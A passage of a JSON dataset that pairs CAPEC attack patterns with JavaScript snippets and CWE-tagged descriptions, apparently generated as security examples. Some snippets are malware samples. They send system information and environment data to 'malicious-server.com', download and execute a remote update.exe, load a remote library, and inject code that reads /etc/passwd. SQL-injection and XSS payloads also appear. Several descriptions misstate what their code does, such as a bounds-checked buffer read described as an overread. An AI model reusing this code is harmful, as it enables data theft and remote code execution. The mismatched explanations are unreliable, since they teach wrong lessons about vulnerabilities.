        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Software Implanted' in a supply chain distribution channel. The code includes several vulnerabilities and malicious behaviors: \n\n1. **CWE-1395: Dependency on Vulnerable Third-Party Component** - The code imports a hypothetical vulnerable library (`vulnerable-lib`).\n2. **CWE-506: Embedded Malicious Code** - The `maliciousFunction` function fetches a malicious payload from a remote server and executes it.\n3. **CWE-509: Replicating Malicious Code (Virus or Worm)** - The malicious payload is fetched and written to the filesystem, potentially allowing it to spread or replicate.\n4. **CWE-1229: Creation of Emergent Resource** - The `createEmergentResource` function creates a new file that could be used by attackers.\n5. **CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy** - The `injectErrors` function logs an error message, simulating the injection of errors to degrade system redundancy.\n\nThe `main` function checks if the vulnerable library is indeed vulnerable and then executes the malicious functions, simulating the implantation of malicious software in a system."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-829: Including functionality from an untrusted source\nconst maliciousLibrary = require('/untrusted/path/maliciousLibrary');\n\n// Function to simulate the integration of a malicious component\nfunction integrateComponent(componentPath) {\n  try {\n    // CWE-506: Embedding malicious code\n    const component = fs.readFileSync(componentPath, 'utf8');\n    const maliciousComponent = component.replace('safeFunction', 'maliciousLibrary.maliciousFunction');\n    fs.writeFileSync(componentPath, maliciousComponent);\n    console.log('Component integrated successfully');\n  } catch (err) {\n    console.error('Error integrating component:', err);\n  }\n}\n\n// CWE-89: SQL Injection vulnerability\nfunction executeQuery(userInput) {\n  const query = `SELECT * FROM users WHERE name = '${userInput}'`; // Vulnerable to SQL Injection\n  // Execute the query (this is just a placeholder, actual DB code would go here)\n  console.log('Executing query:', query);\n}\n\n// CWE-707: Improper Neutralization\nfunction processInput(input) {\n  if (input.includes('<script>')) {\n    console.error('Malicious input detected');\n  } else {\n    console.log('Processing input:', input);\n  }\n}\n\n// CWE-1334: Unauthorized error injection\nfunction injectError() {\n  console.error('Injected error to degrade system redundancy');\n}\n\n// Simulate the rogue integration procedure\nintegrateComponent(path.join(__dirname, 'safeComponent.js'));\nexecuteQuery(\"' OR '1'='1\"); // Example of SQL Injection\nprocessInput('<script>alert(\"XSS\")</script>'); // Example of improper neutralization\ninjectError();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Rogue Integration Procedures' by simulating the integration of a malicious component into a system. The code includes several vulnerabilities related to the CAPEC description:\n\n1. CWE-829: The code imports a library from an untrusted source, which could contain malicious functionality.\n2. CWE-506: The `integrateComponent` function reads a component file, replaces a safe function with a malicious one, and writes it back, embedding malicious code.\n3. CWE-89: The `executeQuery` function constructs an SQL query using user input without proper neutralization, making it vulnerable to SQL Injection.\n4. CWE-707: The `processInput` function checks for malicious input but does not properly neutralize it, demonstrating improper neutralization.\n5. CWE-1334: The `injectError` function simulates the injection of an error to degrade system redundancy.\n\nOverall, the code represents the main idea of the CAPEC by showing how an attacker could alter or establish rogue processes to insert malicious components into a system, leading to various security vulnerabilities."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      xml2js.parseString(body, (err, result) => {\n        if (err) {\n          res.writeHead(400, {'Content-Type': 'text/plain'});\n          res.end('Invalid XML');\n        } else {\n          res.writeHead(200, {'Content-Type': 'text/plain'});\n          res.end('XML Received');\n        }\n      });\n    });\n  } else {\n    res.writeHead(405, {'Content-Type': 'text/plain'});\n    res.end('Method Not Allowed');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP server using Node.js that listens for POST requests containing XML data. When a POST request is received, the server reads the XML data and attempts to parse it using the 'xml2js' library. If the XML is invalid, it responds with a 400 status code and an 'Invalid XML' message. If the XML is valid, it responds with a 200 status code and an 'XML Received' message. This code is vulnerable to an XML Flood attack (CAPEC-230) because it does not impose any limits on the size or number of XML requests it can handle (CWE-770). Additionally, it does not validate the XML against a schema (CWE-112), making it susceptible to malformed or malicious XML content. The lack of proper restrictions on XML entities (CWE-611, CWE-776) further exacerbates the vulnerability, potentially leading to XML Denial of Service (XDoS) attacks."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "const http = require('http');\nconst os = require('os');\nconst fs = require('fs');\n\n// Function to gather system information\nfunction gatherSystemInfo() {\n  const systemInfo = {\n    hostname: os.hostname(),\n    platform: os.platform(),\n    arch: os.arch(),\n    cpus: os.cpus(),\n    networkInterfaces: os.networkInterfaces()\n  };\n  return systemInfo;\n}\n\n// Function to send gathered information to an external server\nfunction sendInfoToServer(info) {\n  const options = {\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/collect-info',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (d) => {\n      process.stdout.write(d);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.write(JSON.stringify(info));\n  req.end();\n}\n\n// Main function to execute the malicious behavior\nfunction main() {\n  const info = gatherSystemInfo();\n  sendInfoToServer(info);\n}\n\n// Execute the main function\nmain();",
        "description": "This JavaScript code snippet demonstrates a malware-directed internal reconnaissance attack. The code gathers sensitive system information such as hostname, platform, architecture, CPU details, and network interfaces using the 'os' module. It then sends this information to an external malicious server using an HTTP POST request. This embodies the CAPEC of 'Malware-Directed Internal Reconnaissance' by using malware to collect and exfiltrate sensitive system information. The code also touches on related CWEs: it exposes sensitive system information (CWE-497), contains potentially malicious code (CWE-506), and could be part of a larger spyware or replicating malicious code scheme (CWE-512, CWE-509)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate the use of a third-party component\nconst thirdPartyComponentPath = path.join(__dirname, 'thirdPartyComponent.js');\n\n// Check if the third-party component exists\nif (fs.existsSync(thirdPartyComponentPath)) {\n  // Load the third-party component\n  const thirdPartyComponent = require(thirdPartyComponentPath);\n  \n  // Use the third-party component\n  thirdPartyComponent.execute();\n} else {\n  console.error('Third-party component not found.');\n}\n\n// Simulate the third-party component with embedded malicious code\n// thirdPartyComponent.js\n// module.exports = {\n//   execute: function() {\n//     // Malicious behavior\n//     console.log('Executing malicious code...');\n//     // Example of malicious action: deleting a critical file\n//     fs.unlinkSync('/path/to/critical/file');\n//   }\n// };",
        "description": "This JavaScript code snippet demonstrates the concept of 'Provide Counterfeit Component' by simulating the use of a third-party component that could be counterfeit or malicious. The main script checks for the existence of a third-party component and then loads and executes it. The embedded comment within the code simulates a malicious third-party component that performs a harmful action, such as deleting a critical file. This example embodies the CAPEC idea by showing how an attacker could provide a counterfeit component that contains embedded malicious code (CWE-506) and how the system's reliance on this untrusted component (CWE-1357) could lead to security vulnerabilities. The code also highlights the dependency on a potentially vulnerable third-party component (CWE-1395)."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "class HardwareComponent {\n  constructor(name, version) {\n    this.name = name;\n    this.version = version;\n    this.updateable = false; // CWE-1329: Component is not updateable\n  }\n\n  execute() {\n    if (this.isMalicious()) {\n      this.injectError(); // CWE-1334: Unauthorized error injection\n      this.modifyMemory(); // CWE-1256: Improper restriction of hardware features\n    }\n  }\n\n  isMalicious() {\n    // CWE-506: Embedded malicious code\n    return this.name === 'maliciousComponent';\n  }\n\n  injectError() {\n    console.log('Injecting error to degrade system redundancy');\n  }\n\n  modifyMemory() {\n    console.log('Modifying hardware memory');\n  }\n}\n\n// Dependency on a vulnerable third-party component (CWE-1395)\nconst thirdPartyComponent = new HardwareComponent('vulnerableComponent', '1.0');\nconst maliciousComponent = new HardwareComponent('maliciousComponent', '1.0');\n\n// Simulate the substitution of a tested component with a malicious one\nconst systemComponents = [thirdPartyComponent, maliciousComponent];\nsystemComponents.forEach(component => component.execute());",
        "description": "This JavaScript code snippet represents a scenario where a hardware component is substituted with a maliciously-altered one, embodying the main idea of the CAPEC 'Hardware Component Substitution'. The class `HardwareComponent` includes properties and methods that reflect various CWEs: it has a non-updateable component (CWE-1329), can inject errors (CWE-1334), and modify hardware memory (CWE-1256). The `isMalicious` method checks if the component is malicious (CWE-506). The code also demonstrates dependency on a vulnerable third-party component (CWE-1395). The `execute` method simulates the malicious actions that could be performed by the substituted component."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "const fs = require('fs');\n\n// CWE-506: Embedded Malicious Code\nfunction updateBIOS(biosFile) {\n  // CWE-1277: Firmware Not Updateable\n  if (!isFirmwareUpdateable()) {\n    console.log('Firmware cannot be updated.');\n    return;\n  }\n\n  // CWE-1231: Improper Prevention of Lock Bit Modification\n  if (!isLockBitSet()) {\n    console.log('Lock bit is not set. Proceeding with update.');\n    fs.writeFileSync('/path/to/bios', biosFile);\n    console.log('BIOS updated successfully.');\n  } else {\n    console.log('Lock bit is set. Cannot update BIOS.');\n  }\n}\n\nfunction isFirmwareUpdateable() {\n  // Simulate a check for firmware update capability\n  return false; // Firmware is not updateable\n}\n\nfunction isLockBitSet() {\n  // Simulate a check for lock bit\n  return false; // Lock bit is not set\n}\n\n// CWE-1220: Insufficient Granularity of Access Control\nfunction downloadMaliciousBIOS() {\n  // Simulate downloading a malicious BIOS file\n  return 'malicious BIOS content';\n}\n\n// CWE-1329: Reliance on Component That is Not Updateable\nconst biosFile = downloadMaliciousBIOS();\nupdateBIOS(biosFile);",
        "description": "This JavaScript code snippet simulates the process of updating a BIOS with a malicious file, embodying the main idea of the CAPEC 'Altered Installed BIOS'. The code includes checks for whether the firmware is updateable (CWE-1277) and whether a lock bit is set to prevent modification (CWE-1231). It also simulates downloading a malicious BIOS file (CWE-506) and demonstrates insufficient granularity of access control (CWE-1220) by allowing the update to proceed without proper checks. Additionally, it highlights reliance on a component that is not updateable (CWE-1329). The code represents the potential vulnerabilities and exploitation methods described in the CAPEC."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://malicious-site.com/update', (res) => {\n  if (res.statusCode === 200) {\n    let file = fs.createWriteStream('update.exe');\n    res.pipe(file);\n    file.on('finish', () => {\n      file.close();\n      console.log('Update downloaded and saved as update.exe');\n      require('child_process').exec('update.exe', (err) => {\n        if (err) throw err;\n        console.log('Update executed');\n      });\n    });\n  } else {\n    console.log('Failed to download update');\n  }\n}).on('error', (e) => {\n  console.error(`Got error: ${e.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable software update mechanism. It downloads an executable file from a remote server without verifying the integrity or origin of the file (CWE-494). The downloaded file is then executed, potentially allowing malicious code to run on the victim's system (CWE-506). The code does not implement any server-side security checks, relying entirely on the client to handle the update process (CWE-602). This represents the main idea of the CAPEC 'Malicious Manual Software Update', where an attacker can introduce malicious code through a compromised update process."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.firmwareVersion = '1.0.0';\n    this.isUpdateable = false; // CWE-1277: Firmware Not Updateable\n  }\n\n  updateFirmware(newVersion) {\n    if (this.isUpdateable) {\n      this.firmwareVersion = newVersion;\n    } else {\n      console.log('Firmware update not supported.');\n    }\n  }\n\n  injectMaliciousCode() { // CWE-506: Embedded Malicious Code\n    console.log('Malicious code executed!');\n    // Malicious actions here\n  }\n}\n\n// Simulate hardware replacement with malicious component\nlet component = new HardwareComponent();\ncomponent.injectMaliciousCode();\n\n// Attempt to update firmware\ncomponent.updateFirmware('1.0.1');",
        "description": "This JavaScript code snippet represents a scenario where a hardware component is replaced with a malicious one, embodying the main idea of the CAPEC 'Malicious Hardware Update'. The class `HardwareComponent` has a firmware version that is not updateable (CWE-1277). The `injectMaliciousCode` method simulates the presence of embedded malicious code (CWE-506). The code demonstrates how an adversary could introduce a malicious component that cannot be updated to fix vulnerabilities, and then execute malicious actions. This highlights the risks associated with hardware updates and replacements, especially when the new components are not secure or updateable."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.firmware = 'v1.0'; // CWE-1329: Non-updateable firmware\n    this.trusted = false; // CWE-1357: Insufficiently trustworthy component\n  }\n\n  execute() {\n    if (!this.trusted) {\n      this.maliciousCode(); // CWE-506: Embedded malicious code\n    }\n  }\n\n  maliciousCode() {\n    console.log('Executing malicious code...');\n    // CWE-1297: Accessing unprotected confidential information\n    let confidentialData = this.accessConfidentialData();\n    console.log('Confidential Data:', confidentialData);\n  }\n\n  accessConfidentialData() {\n    return 'Sensitive Information';\n  }\n}\n\n// Simulating the use of a vulnerable third-party component\nlet component = new HardwareComponent(); // CWE-1395: Dependency on vulnerable third-party component\ncomponent.execute();",
        "description": "This JavaScript code snippet represents a hardware component class that embodies the main idea of the CAPEC 'Malicious Gray Market Hardware'. The class contains a non-updateable firmware (CWE-1329) and is marked as untrusted (CWE-1357). When the execute method is called, it checks if the component is trusted. If not, it runs a malicious code method (CWE-506) that accesses and logs confidential data (CWE-1297). The instantiation of the HardwareComponent class simulates the use of a vulnerable third-party component (CWE-1395). This code demonstrates how malicious hardware can compromise a system by embedding harmful code and accessing sensitive information."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "const fs = require('fs');\nconst configFilePath = '/etc/app/config.json';\n\n// CWE-284: Improper Access Control\nif (fs.existsSync(configFilePath)) {\n  const configData = fs.readFileSync(configFilePath, 'utf8');\n  let config;\n  try {\n    config = JSON.parse(configData);\n  } catch (e) {\n    console.error('Invalid JSON format in config file');\n    process.exit(1);\n  }\n\n  // CWE-99: Improper Control of Resource Identifiers\n  const resourcePath = config.resourcePath;\n  if (resourcePath) {\n    // CWE-377: Insecure Temporary File\n    const tempFilePath = `/tmp/${resourcePath}`;\n    fs.writeFileSync(tempFilePath, 'Temporary data');\n    console.log(`Temporary file created at ${tempFilePath}`);\n  }\n\n  // CWE-201: Insertion of Sensitive Information Into Sent Data\n  const sensitiveData = config.sensitiveData;\n  if (sensitiveData) {\n    console.log(`Sending sensitive data: ${sensitiveData}`);\n  }\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker could inject malicious data into a configuration file, leading to various vulnerabilities. The code reads a configuration file without proper access control (CWE-284), parses it, and uses its contents to create a temporary file insecurely (CWE-377). It also improperly handles resource identifiers (CWE-99) and sends sensitive data (CWE-201). This embodies the CAPEC idea of injecting malicious data during configuration, causing the system to perform suboptimally or insecurely."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "const fs = require('fs');\n\n// CWE-506: Embedded Malicious Code\nfunction injectMaliciousCode(filePath) {\n  const maliciousCode = `\n    // Malicious code injected\n    console.log('Malicious code executed');\n    // CWE-497: Exposure of Sensitive System Information\n    const sensitiveInfo = fs.readFileSync('/etc/passwd', 'utf8');\n    console.log(sensitiveInfo);\n  `;\n\n  // CWE-1297: Unprotected Confidential Information\n  let fileContent = fs.readFileSync(filePath, 'utf8');\n  fileContent += maliciousCode;\n  fs.writeFileSync(filePath, fileContent, 'utf8');\n}\n\n// CWE-1329: Reliance on Component That is Not Updateable\nconst vulnerableComponent = {\n  updateable: false,\n  version: '1.0.0'\n};\n\nif (!vulnerableComponent.updateable) {\n  console.log('Warning: Component cannot be updated.');\n}\n\n// Simulate infiltration of hardware development environment\ninjectMaliciousCode('hardwareFirmware.js');",
        "description": "This JavaScript code snippet simulates the infiltration of a hardware development environment by injecting malicious code into a firmware file. The `injectMaliciousCode` function appends malicious code to a specified file, which reads and logs sensitive system information (CWE-497). The code also checks for a non-updateable component (CWE-1329) and logs a warning if the component cannot be updated. This represents the CAPEC scenario where an adversary manipulates the development environment to insert malicious software, potentially compromising the hardware components destined for deployment."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Downloading a library without integrity check\nhttps.get('https://example.com/malicious-library.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    // Including the downloaded library\n    fs.writeFileSync('malicious-library.js', data);\n    require('./malicious-library');\n  });\n}).on('error', (err) => {\n  console.error('Error downloading the library:', err);\n});",
        "description": "This JavaScript code snippet demonstrates the concept of 'Open-Source Library Manipulation' by downloading a library from a remote location without performing any integrity checks (CWE-494). The downloaded library is then included and executed within the application (CWE-829). This scenario can lead to the inclusion of malicious code (CWE-506) and potentially replicating malicious code (CWE-509). Additionally, if the downloaded library has known vulnerabilities, it can introduce further risks (CWE-1395). The code highlights the dangers of incorporating untrusted and unchecked third-party components into a project."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "function processSensitiveData(data) {\n  // CWE-506: Embedded Malicious Code\n  if (data.includes('sensitive')) {\n    // Malicious functionality: log sensitive data\n    console.log('Sensitive data accessed:', data);\n  }\n\n  // CWE-497: Exposure of Sensitive System Information\n  if (data.includes('systemInfo')) {\n    // Expose system information to unauthorized control sphere\n    console.log('System Information:', getSystemInfo());\n  }\n\n  // CWE-11: ASP.NET Misconfiguration: Creating Debug Binary\n  if (data.includes('debug')) {\n    // Debugging message that could help attackers\n    console.log('Debugging data:', data);\n  }\n\n  // CWE-1294: Insecure Security Identifier Mechanism\n  if (data.includes('securityID')) {\n    // Incorrect implementation of Security Identifiers\n    console.log('Security Identifier:', getSecurityIdentifier(data));\n  }\n\n  // CWE-1259: Improper Restriction of Security Token Assignment\n  if (data.includes('securityToken')) {\n    // Improperly protected Security Tokens\n    console.log('Security Token:', getSecurityToken(data));\n  }\n}\n\nfunction getSystemInfo() {\n  // Simulate retrieval of system information\n  return 'System Info: [REDACTED]';\n}\n\nfunction getSecurityIdentifier(data) {\n  // Simulate retrieval of a security identifier\n  return 'Security ID: [REDACTED]';\n}\n\nfunction getSecurityToken(data) {\n  // Simulate retrieval of a security token\n  return 'Security Token: [REDACTED]';\n}",
        "description": "This JavaScript code snippet demonstrates the insertion of malicious functionality into a system, aligning with the CAPEC description of 'ASIC With Malicious Functionality'. The code includes several vulnerabilities: CWE-506 (Embedded Malicious Code) by logging sensitive data, CWE-497 (Exposure of Sensitive System Information) by exposing system information, CWE-11 (ASP.NET Misconfiguration: Creating Debug Binary) by logging debugging messages, CWE-1294 (Insecure Security Identifier Mechanism) by incorrectly handling security identifiers, and CWE-1259 (Improper Restriction of Security Token Assignment) by improperly protecting security tokens. This snippet represents how an attacker might embed malicious code to disrupt or compromise a system."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "function readBuffer(buffer, index) {\n  if (index < 0 || index >= buffer.length) {\n    console.log('Index out of bounds');\n    return;\n  }\n  return buffer[index];\n}\n\nconst buffer = [1, 2, 3, 4, 5];\nconst index = 10; // Out-of-bounds index\nconsole.log(readBuffer(buffer, index));",
        "description": "This JavaScript code snippet demonstrates a potential buffer over-read vulnerability. The function `readBuffer` attempts to read an element from the `buffer` array at a specified `index`. If the `index` is out of the valid range (less than 0 or greater than or equal to the buffer's length), it logs an 'Index out of bounds' message and returns. However, the code still attempts to read from the buffer using an out-of-bounds index, which can lead to undefined behavior or exposure of sensitive information. This snippet embodies the main idea of CAPEC-129: Overread Buffers, and relates to CWE-125: Out-of-bounds Read and CWE-126: Buffer Over-read."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const userAgent = req.headers['user-agent'];\n  let responseMessage = '';\n\n  if (userAgent.includes('Mozilla')) {\n    responseMessage = 'Hello, Firefox user!';\n  } else if (userAgent.includes('Chrome')) {\n    responseMessage = 'Hello, Chrome user!';\n  } else {\n    responseMessage = 'Hello, user!';\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(responseMessage);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that responds differently based on the 'User-Agent' header of incoming requests. The server checks if the 'User-Agent' contains 'Mozilla' or 'Chrome' and sends a specific message accordingly. This behavior can be exploited for application fingerprinting (CAPEC-170) as it reveals information about the type of client making the request. The code also demonstrates CWE-204 (Observable Response Discrepancy) by providing different responses based on the 'User-Agent', which can be used by an adversary to infer the internal state of the application."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// Trojan Horse: Functionality appears benign\nfunction fetchData(url) {\n  http.get(url, (res) => {\n    let data = '';\n    res.on('data', (chunk) => {\n      data += chunk;\n    });\n    res.on('end', () => {\n      console.log('Data fetched:', data);\n      // Spyware: Collecting sensitive information\n      const sensitiveInfo = process.env.USER_DATA;\n      // Embedded Malicious Code: Sending sensitive info to attacker\n      http.request({\n        hostname: 'malicious-server.com',\n        path: '/collect',\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/json'\n        }\n      }, (res) => {\n        res.on('data', (d) => process.stdout.write(d));\n      }).end(JSON.stringify({ info: sensitiveInfo }));\n    });\n  }).on('error', (err) => {\n    console.error('Error fetching data:', err.message);\n  });\n}\n\n// Replicating Malicious Code: Attempt to spread\nfunction replicate() {\n  const script = fs.readFileSync(__filename, 'utf8');\n  fs.writeFileSync('/tmp/malicious_copy.js', script);\n}\n\n// Execute the functions\nfetchData('http://example.com');\nreplicate();",
        "description": "This JavaScript code snippet demonstrates a targeted malware attack that leverages multiple weaknesses. The `fetchData` function appears to be a benign function fetching data from a URL, but it also collects sensitive information from the environment (simulating spyware behavior) and sends it to a malicious server (embedded malicious code). The `replicate` function reads the current script and writes a copy to another location, simulating the behavior of replicating malicious code. This snippet embodies the main idea of CAPEC-Targeted Malware by exploiting known vulnerabilities and weaknesses to achieve malicious objectives."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  if (redirectUrl) {\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n  } else {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.write('<html><body><h1>Welcome to the counterfeit site!</h1></body></html>');\n    res.end();\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server that embodies the concept of a counterfeit website. The server listens for incoming requests and checks if there is a 'redirect' query parameter in the URL. If the 'redirect' parameter is present, the server performs an open redirect to the specified URL (CWE-601), which can be used to redirect users to malicious sites. If the 'redirect' parameter is not present, the server responds with a basic HTML page, simulating a counterfeit site. This counterfeit site can be used to gather information or upload malware (CAPEC-409). The code demonstrates vulnerabilities such as open redirect (CWE-601) and the potential for embedding malicious content (CWE-506)."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "const https = require('https');\n\nfunction fetchData(url) {\n  const options = {\n    hostname: 'counterfeit-supplier.com', // CWE-941: Incorrectly Specified Destination\n    port: 443,\n    path: '/data',\n    method: 'GET',\n    rejectUnauthorized: false // CWE-295: Improper Certificate Validation\n  };\n\n  const req = https.request(options, (res) => {\n    let data = '';\n\n    res.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    res.on('end', () => {\n      console.log('Received data:', data);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.end();\n}\n\nfetchData('https://legitimate-supplier.com'); // CWE-941: Incorrectly Specified Destination",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary creates a counterfeit organization that injects malicious components into the supply chain. The code fetches data from a counterfeit supplier ('counterfeit-supplier.com') instead of the legitimate one ('legitimate-supplier.com'), representing CWE-941 (Incorrectly Specified Destination). Additionally, the code does not validate the SSL certificate properly (CWE-295: Improper Certificate Validation), making it easier for an attacker to intercept and manipulate the data. This snippet embodies the main idea of the CAPEC by showing how an adversary can exploit weaknesses to introduce malicious components into the supply chain."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "const fs = require('fs');\nconst sensitiveFilePath = '/path/to/sensitive/file';\n\n// Function to read sensitive data from a file\nfunction readSensitiveData() {\n  try {\n    const data = fs.readFileSync(sensitiveFilePath, 'utf8');\n    console.log('Sensitive Data:', data);\n  } catch (err) {\n    console.error('Error reading file:', err);\n  }\n}\n\n// Simulate a debug mode where sensitive data is not cleared\nfunction enterDebugMode() {\n  console.log('Entering debug mode...');\n  // Sensitive data should be cleared here but it is not\n  readSensitiveData();\n}\n\n// Simulate a power state transition without clearing sensitive data\nfunction powerStateTransition() {\n  console.log('Performing power state transition...');\n  // Sensitive data should be cleared here but it is not\n  readSensitiveData();\n}\n\n// Main function to demonstrate the vulnerability\nfunction main() {\n  readSensitiveData();\n  enterDebugMode();\n  powerStateTransition();\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data is read from a file and is not properly cleared during debug mode or power state transitions. The `readSensitiveData` function reads and logs sensitive data from a specified file. The `enterDebugMode` and `powerStateTransition` functions simulate transitions where sensitive data should be cleared but is not, thus exposing the data. This embodies the main idea of the CAPEC 'Pull Data from System Resources' by showing how an adversary can gather useful information from system resources due to improper handling of sensitive data, as highlighted by the related CWEs."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "const fs = require('fs');\n\n// Simulate tenant data storage\nlet tenantData = {\n  tenantId: 'tenant123',\n  sensitiveInfo: 'password123'\n};\n\n// Store tenant data in a file\nfs.writeFileSync('tenantData.json', JSON.stringify(tenantData));\n\n// Simulate tenant leaving and new tenant allocation\nfunction allocateNewTenant() {\n  // Incomplete data deletion\n  fs.unlinkSync('tenantData.json'); // This only deletes the file, not the data on disk\n\n  // New tenant allocated\n  let newTenantData = fs.readFileSync('tenantData.json', 'utf8');\n  console.log('New tenant data:', newTenantData);\n}\n\nallocateNewTenant();",
        "description": "This JavaScript code snippet simulates a multi-tenant environment where sensitive data from a previous tenant is not properly deleted before a new tenant is allocated. The code first stores sensitive information for a tenant in a file. When the tenant leaves, the file is deleted using `fs.unlinkSync`, which does not securely erase the data from the disk. A new tenant is then allocated, and the code attempts to read the data from the same file, potentially exposing the previous tenant's sensitive information. This demonstrates the vulnerability described in the CAPEC, where incomplete data deletion can lead to unauthorized access to sensitive information. The code also touches on related CWEs such as improper access control and improper removal of sensitive information."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class Device {\n  constructor() {\n    this.data = 'Sensitive Information';\n  }\n\n  destroy() {\n    // CWE-1082: Self-destruction of the class instance\n    delete this;\n  }\n\n  incompleteDataRemoval() {\n    // CWE-1301: Incomplete data removal\n    this.data = null; // Data is set to null but not completely removed\n  }\n\n  sensitiveOperation() {\n    // CWE-1300: Lack of protection against physical side channels\n    console.log('Performing sensitive operation');\n  }\n}\n\n// Simulating physical destruction\nlet device = new Device();\ndevice.destroy();\n\n// Simulating incomplete data removal\nlet anotherDevice = new Device();\nanotherDevice.incompleteDataRemoval();\n\n// Simulating sensitive operation without side-channel protection\nanotherDevice.sensitiveOperation();",
        "description": "This JavaScript code snippet represents the concept of 'Physical Destruction of Device or Component' by simulating a device class that can destroy itself, incompletely remove data, and perform sensitive operations without protection against physical side channels. The 'destroy' method embodies CWE-1082 by deleting the class instance. The 'incompleteDataRemoval' method represents CWE-1301 by setting sensitive data to null without completely removing it. The 'sensitiveOperation' method demonstrates CWE-1300 by performing an operation that could be vulnerable to physical side-channel attacks. This code highlights the vulnerabilities that can arise from improper handling of physical destruction and data removal processes."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "const sensitiveData = 'TopSecretInformation';\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nfetch('http://example.com/api', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  },\n  body: JSON.stringify({ data: sensitiveData })\n})\n.then(response => response.json())\n.then(data => console.log(data))\n.catch(error => console.error('Error:', error));\n\n// CWE-922: Insecure Storage of Sensitive Information\nlocalStorage.setItem('sensitiveData', sensitiveData);\n\n// CWE-226: Sensitive Information in Resource Not Removed Before Reuse\nlet reusedResource = sensitiveData;\nreusedResource = null; // Sensitive data not properly cleared before reuse\n\n// CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\nconst logSensitiveData = (data) => {\n  console.log('Logging data:', data); // Sensitive data logged without removal\n};\nlogSensitiveData(sensitiveData);\n\n// CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\nconst shareSensitiveData = (data) => {\n  // Sharing sensitive data with untrusted third party\n  fetch('http://untrusted.com/share', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify({ data: data })\n  });\n};\nshareSensitiveData(sensitiveData);",
